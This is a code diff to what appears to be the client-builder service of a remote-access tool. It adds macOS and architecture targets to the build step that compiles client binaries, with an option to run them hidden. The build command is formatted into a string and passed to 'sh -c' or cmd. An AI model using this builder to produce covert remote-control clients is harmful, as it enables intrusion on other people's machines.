@@ -5,6 +5,11 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"os"
+	"os/exec"
+	"strings"
+	"sync"
+
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/entities"
@@ -20,10 +25,6 @@ import (
 	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
 	"github.com/tiagorlampert/CHAOS/services/auth"
 	syscallCmd "github.com/tiagorlampert/CHAOS/services/client/syscall_cmd"
-	"os"
-	"os/exec"
-	"strings"
-	"sync"
 )
 
 const (
@@ -32,15 +33,7 @@ const (
 	configFileName       = "config.json"
 	mainFileName         = "main.go"
 	clientConfigFilepath = "app/utils/config.go"
-	buildStr             = `go build -ldflags="%s -s -w -X 'main.Version=%s' -extldflags -static" -o ../../temp/%s main.go`
-)
-
-var (
-	envVarBuildMap = map[string]string{
-		"GO_ENABLED": "1",
-		"GOOS":       "%s",
-		"GOARCH":     "amd64",
-	}
+	buildStr             = `GO_ENABLED=1 GOOS=%s GOARCH=%s go1.20.14 build -ldflags '%s -s -w -X main.Version=%s -extldflags "-static"' -o ../../temp/%s main.go`
 )
 
 type clientService struct {
@@ -99,7 +92,6 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 		Command:   input.Command,
 		Parameter: input.Parameter,
 	}
-
 	req, err := json.Marshal(command)
 	if err != nil {
 		return SendCommandOutput{}, err
@@ -169,14 +161,15 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	defer utils.RemoveDir(buildPath)
 
 	filename := buildFilename(input.OSTarget, input.GetFilename())
-	buildCmd := fmt.Sprintf(getEnvVarBuild()+" "+buildStr, getOSBuildParam(input.OSTarget), getRunHiddenBuildParam(input.RunHidden), c.AppVersion, filename)
+
+	buildCmd := fmt.Sprintf(buildStr, getOSBuildParam(input.OSTarget), getOSArchBuildParam(input.OSArch), getRunHiddenBuildParam(input.RunHidden), c.AppVersion, filename)
 
 	var cmd *exec.Cmd
 
 	switch system.DetectOS() {
 	case system.Windows:
 		cmd = exec.Command("cmd")
-		cmd.SysProcAttr = syscallCmd.GetCmdSyscall(buildCmd)
+		cmd.SysProcAttr = syscallCmd.GetCmdWindowsSyscall(buildCmd)
 		break
 	default:
 		cmd = exec.Command("sh", "-c", buildCmd)
@@ -309,6 +302,7 @@ func getOSBuildParam(osType system.OSType) string {
 	const (
 		windowsKey = "windows"
 		linuxKey   = "linux"
+		darwinKey  = "darwin"
 		unknownKey = "unknown"
 	)
 	switch osType {
@@ -316,33 +310,27 @@ func getOSBuildParam(osType system.OSType) string {
 		return windowsKey
 	case system.Linux:
 		return linuxKey
+	case system.Darwin:
+		return darwinKey
 	default:
 		return unknownKey
 	}
 }
 
-func getEnvVarBuild() string {
+func getOSArchBuildParam(osArch string) string {
 	const (
-		linuxEnvVarPrefixSeparator   = " "
-		linuxEnvVarSuffixSeparator   = " "
-		windowsEnvVarSuffixSeparator = " | "
-		windowsEnvVarPrefixSeparator = " set "
+		amd64Key = "amd64"
+		x86Key   = "386"
 	)
-
-	switch system.DetectOS() {
-	case system.Windows:
-		return MapKeysString(envVarBuildMap, windowsEnvVarPrefixSeparator, windowsEnvVarSuffixSeparator)
+	fmt.Println(osArch)
+	switch osArch {
+	case "amd64":
+		return amd64Key
+	case "386":
+		return x86Key
 	default:
-		return MapKeysString(envVarBuildMap, linuxEnvVarPrefixSeparator, linuxEnvVarSuffixSeparator)
+		return x86Key
 	}
-}
-
-func MapKeysString(m map[string]string, prefixSeparator string, suffixSeparator string) string {
-	keys := make([]string, 0, len(m))
-	for k, v := range m {
-		keys = append(keys, strings.ReplaceAll(fmt.Sprintf("%s %s=%s %s", prefixSeparator, k, v, suffixSeparator), "  ", " "))
-	}
-	return strings.Join(keys, "")
 }
 
 func getRunHiddenBuildParam(hidden bool) string {
